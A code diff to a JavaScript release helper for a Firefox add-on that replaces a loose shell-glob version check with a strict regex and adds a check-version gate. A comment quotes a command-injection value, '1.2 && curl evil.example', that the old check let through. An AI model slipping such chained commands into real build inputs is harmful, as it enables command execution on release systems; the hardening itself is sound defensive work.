@@ -41,6 +41,22 @@ export function isReadableVersion(value) {
 }
 
 /**
+ * Mozilla's own rule for a manifest version, quoted from the MDN `version` page rather than
+ * invented here: one to four dot-separated numbers, digits only, at most nine digits per part, no
+ * leading zeros except a bare `0`.
+ *
+ * This replaced a shell glob — `[0-9]*.[0-9]*` — which was the kind of validator that looks like
+ * one. It accepted `0abc.9xyz`, `2.01`, `1.2-beta`, `1.2.3.4.5` and, memorably,
+ * `1.2 && curl evil.example`.
+ */
+export const AMO_VERSION_RE = /^(0|[1-9][0-9]{0,8})([.](0|[1-9][0-9]{0,8})){0,3}$/;
+
+/** Is this a version AMO will accept? Blank, padded and non-string values are all rejected. */
+export function isValidAddonVersion(value) {
+  return isReadableVersion(value) && AMO_VERSION_RE.test(value);
+}
+
+/**
  * Does AMO already hold this version of this add-on?
  *
  * Deliberately strict about what counts as "no". An unparseable body, an auth error, or a
@@ -267,11 +283,32 @@ export function readCount(raw) {
  * is UNKNOWN, which the workflow treats as a stop rather than a guess.
  */
 if (process.argv[1] && process.argv[1].endsWith("amoApi.mjs")) {
-  const [, , command, addonId, version] = process.argv;
+  const [, , command, ...rest] = process.argv;
+
+  // `check-version` is the workflow's gate on the version it read out of the packaged manifest.
+  // Exits 2 on anything AMO would refuse, so a malformed value stops the release here rather than
+  // travelling on to be queried, not found, and submitted.
+  if (command === "check-version") {
+    const [candidate] = rest;
+    if (!isValidAddonVersion(candidate)) {
+      console.error(
+        `not a version AMO accepts: ${JSON.stringify(candidate)} — expected 1 to 4 dot-separated ` +
+          `numbers, digits only, no leading zeros (e.g. 0.36.0)`,
+      );
+      process.exit(2);
+    }
+    console.log(candidate);
+    process.exit(0);
+  }
+
+  const [addonId, version] = rest;
   // `!version` alone lets " " through, and a blank version asks AMO a question with no answer.
-  // Exit 2, the same code as "cannot tell", so the workflow stops rather than submitting.
-  if (command !== "has-version" || !isReadableVersion(addonId) || !isReadableVersion(version)) {
-    console.error("usage: node amoApi.mjs has-version <addonId> <version>  (neither may be blank)");
+  // The version is also the one about to be SUBMITTED, so it is held to AMO's format here too:
+  // querying a malformed version can only ever return "not found", which means submit. Exit 2,
+  // the same code as "cannot tell", so the workflow stops.
+  if (command !== "has-version" || !isReadableVersion(addonId) || !isValidAddonVersion(version)) {
+    console.error("usage: node amoApi.mjs has-version <addonId> <version>  (version must be AMO-valid)");
+    console.error("       node amoApi.mjs check-version <version>");
     process.exit(2);
   }
   const token = await mintJwt(process.env.AMO_JWT_ISSUER, process.env.AMO_JWT_SECRET);
